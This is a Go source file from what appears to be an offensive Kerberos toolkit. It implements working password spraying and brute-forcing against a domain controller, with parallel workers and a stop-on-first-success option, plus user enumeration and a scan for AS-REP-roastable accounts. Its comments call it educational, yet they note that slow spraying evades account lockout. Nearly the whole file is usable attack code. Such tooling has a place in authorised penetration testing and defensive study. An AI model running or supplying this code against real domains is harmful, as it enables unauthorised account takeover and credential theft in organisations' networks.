package client

import (
	"context"
	"encoding/asn1"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/goobeus/goobeus/internal/network"
	"github.com/goobeus/goobeus/pkg/asn1krb5"
)

// EDUCATIONAL: Password Brute-Forcing and Pre-Auth Scanning
//
// Kerberos pre-authentication can be used for:
//   - Password spraying (one password, many users)
//   - Brute forcing (many passwords, one user)
//   - User enumeration (check if users exist)
//
// Error codes reveal information:
//   - KDC_ERR_PREAUTH_REQUIRED (25): User exists, password wrong
//   - KDC_ERR_PREAUTH_FAILED (24): User exists, password wrong
//   - KDC_ERR_C_PRINCIPAL_UNKNOWN (6): User doesn't exist
//   - No error + AS-REP: Correct password!
//
// Pre-auth scanning finds accounts without pre-auth (AS-REP roastable).

// BruteRequest configures a brute force attack.
type BruteRequest struct {
	Users     []string
	Passwords []string
	Domain    string
	KDC       string

	// Options
	Threads   int  // Parallel threads
	StopFirst bool // Stop on first success
}

// BruteResult contains brute force results.
type BruteResult struct {
	Username string
	Password string
	Success  bool
	Error    string
}

// Brute performs password brute-forcing against Kerberos.
//
// EDUCATIONAL: Password Spraying via Kerberos
//
// This is useful because:
//   - No account lockout if we spray slowly
//   - Direct feedback (error codes tell us result)
//   - Works without network access to other services
//
// We attempt AS-REQ with pre-authentication for each combo.
func Brute(ctx context.Context, req *BruteRequest) ([]BruteResult, error) {
	if len(req.Users) == 0 {
		return nil, fmt.Errorf("at least one user is required")
	}
	if len(req.Passwords) == 0 {
		return nil, fmt.Errorf("at least one password is required")
	}
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}

	if req.Threads <= 0 {
		req.Threads = 1
	}

	var results []BruteResult
	var mu sync.Mutex
	found := false

	// Create work channel
	type work struct {
		user string
		pass string
	}
	workChan := make(chan work, len(req.Users)*len(req.Passwords))

	// Queue work
	for _, user := range req.Users {
		for _, pass := range req.Passwords {
			workChan <- work{user, pass}
		}
	}
	close(workChan)

	// Worker
	var wg sync.WaitGroup
	for i := 0; i < req.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for w := range workChan {
				if req.StopFirst && found {
					return
				}

				result := tryCredential(ctx, w.user, w.pass, req.Domain, req.KDC)

				mu.Lock()
				results = append(results, result)
				if result.Success {
					found = true
				}
				mu.Unlock()
			}
		}()
	}

	wg.Wait()
	return results, nil
}

func tryCredential(ctx context.Context, user, pass, domain, kdc string) BruteResult {
	result := BruteResult{
		Username: user,
		Password: pass,
	}

	_, err := AskTGTWithContext(ctx, &TGTRequest{
		Domain:   domain,
		Username: user,
		Password: pass,
		KDC:      kdc,
	})

	if err == nil {
		result.Success = true
	} else {
		result.Error = err.Error()
		// Check for specific errors
		if krbErr, ok := err.(*KerberosError); ok {
			if krbErr.Code == 24 {
				result.Error = "wrong password"
			} else if krbErr.Code == 6 {
				result.Error = "user not found"
			}
		}
	}

	return result
}

// PreAuthScanRequest configures a pre-auth scan.
type PreAuthScanRequest struct {
	Users  []string
	Domain string
	KDC    string
}

// PreAuthScanResult contains pre-auth scan results.
type PreAuthScanResult struct {
	Username       string
	Exists         bool
	PreAuthReq     bool // Pre-auth required?
	ASREPRoastable bool // No pre-auth = AS-REP roastable
	Error          string
}

// PreAuthScan checks if users require pre-authentication.
//
// EDUCATIONAL: Finding AS-REP Roastable Accounts
//
// We send AS-REQ without pre-auth data:
//   - KDC_ERR_PREAUTH_REQUIRED: User exists, pre-auth required (normal)
//   - AS-REP: No pre-auth required! = AS-REP roastable
//   - KDC_ERR_C_PRINCIPAL_UNKNOWN: User doesn't exist
func PreAuthScan(ctx context.Context, req *PreAuthScanRequest) ([]PreAuthScanResult, error) {
	if len(req.Users) == 0 {
		return nil, fmt.Errorf("at least one user is required")
	}
	if req.Domain == "" {
		return nil, fmt.Errorf("domain is required")
	}

	var results []PreAuthScanResult

	for _, user := range req.Users {
		result := PreAuthScanResult{Username: user}

		// Build and send AS-REQ without pre-auth
		asReqBytes := buildASREQNoPreauthBytes(user, req.Domain)

		respBytes, err := network.SendToKDCWithContext(ctx, req.Domain, req.KDC, asReqBytes)
		if err != nil {
			result.Error = err.Error()
			results = append(results, result)
			continue
		}

		// Check response
		if isASREP(respBytes) {
			// Got AS-REP without pre-auth = roastable!
			result.Exists = true
			result.PreAuthReq = false
			result.ASREPRoastable = true
		} else if isKRBError(respBytes) {
			errCode := extractKRBErrorCode(respBytes)
			switch errCode {
			case 25: // KDC_ERR_PREAUTH_REQUIRED
				result.Exists = true
				result.PreAuthReq = true
			case 6: // KDC_ERR_C_PRINCIPAL_UNKNOWN
				result.Exists = false
			default:
				result.Exists = true
				result.Error = fmt.Sprintf("KRB error %d", errCode)
			}
		}

		results = append(results, result)
	}

	return results, nil
}

func buildASREQNoPreauthBytes(user, domain string) []byte {
	// Build AS-REQ without pre-auth
	asReq := buildASREQNoPreauth(user, domain)
	data, _ := asn1.MarshalWithParams(asReq, "application,tag:10")
	return data
}

func buildASREQNoPreauth(user, domain string) *asn1krb5.ASREQ {
	// Reuse from roast package logic
	now := time.Now().UTC()

	cname := asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTPrincipal,
		NameString: []string{user},
	}

	sname := asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTSrvInst,
		NameString: []string{"krbtgt", domain},
	}

	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable
	optionsBits := make([]byte, 4)
	optionsBits[0] = byte((options >> 24) & 0xFF)
	optionsBits[1] = byte((options >> 16) & 0xFF)
	optionsBits[2] = byte((options >> 8) & 0xFF)
	optionsBits[3] = byte(options & 0xFF)

	body := asn1krb5.KDCReqBody{
		KDCOptions: asn1.BitString{
			Bytes:     optionsBits,
			BitLength: 32,
		},
		CName: cname,
		Realm: domain,
		SName: sname,
		Till:  now.Add(10 * time.Hour),
		Nonce: int32(now.UnixNano() & 0x7FFFFFFF),
		EType: []int32{23, 18, 17},
	}

	return &asn1krb5.ASREQ{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeASREQ,
		ReqBody: body,
	}
}

func isASREP(data []byte) bool {
	// AS-REP has APPLICATION tag 11 (0x6b)
	return len(data) > 0 && data[0] == 0x6b
}

func isKRBError(data []byte) bool {
	// KRB-ERROR has APPLICATION tag 30 (0x7e)
	return len(data) > 0 && data[0] == 0x7e
}

func extractKRBErrorCode(data []byte) int32 {
	var krbErr asn1krb5.KRBError
	_, err := asn1.UnmarshalWithParams(data, &krbErr, "application,tag:30")
	if err != nil {
		return -1
	}
	return krbErr.ErrorCode
}

// Deduplicate strings
func uniqueStrings(s []string) []string {
	seen := make(map[string]bool)
	result := []string{}
	for _, v := range s {
		v = strings.TrimSpace(v)
		if v != "" && !seen[v] {
			seen[v] = true
			result = append(result, v)
		}
	}
	return result
}
